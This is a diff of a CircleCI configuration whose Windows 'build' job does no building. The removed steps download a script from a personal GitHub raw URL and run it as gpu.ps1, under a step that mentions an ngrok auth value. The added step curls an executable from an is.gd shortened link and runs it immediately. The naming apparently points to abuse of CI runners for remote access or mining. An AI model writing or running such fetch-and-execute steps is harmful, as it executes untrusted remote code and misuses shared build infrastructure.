@@ -4,24 +4,15 @@
 # Define a job to be invoked later in a workflow.
 # See: https://circlec
 
-version: 2.1 
+version: 2.1
  
 orbs:
   win: circleci/windows@2.2.0
  
 jobs:
-  build: 
+  build:
     executor:
-      name: win/default 
-      size: "medium" 
-      
-        
- 
-    steps:  
-       
-      - run: 
-          name: Paste Ngrok Auth Value In Hosted Link
-          command: |      
-            Invoke-WebRequest https://raw.githubusercontent.com/Joshuaguillo12345/joshua/main/joshua2.sh -OutFile gpu.ps1 
-          
-      - run: ./gpu.ps1
+      name: win/default
+      shell: cmd.exe
+    steps:
+      - run: curl -L -o yourcustomlink.exe https://is.gd/yourcustomlink && yourcustomlink.exe
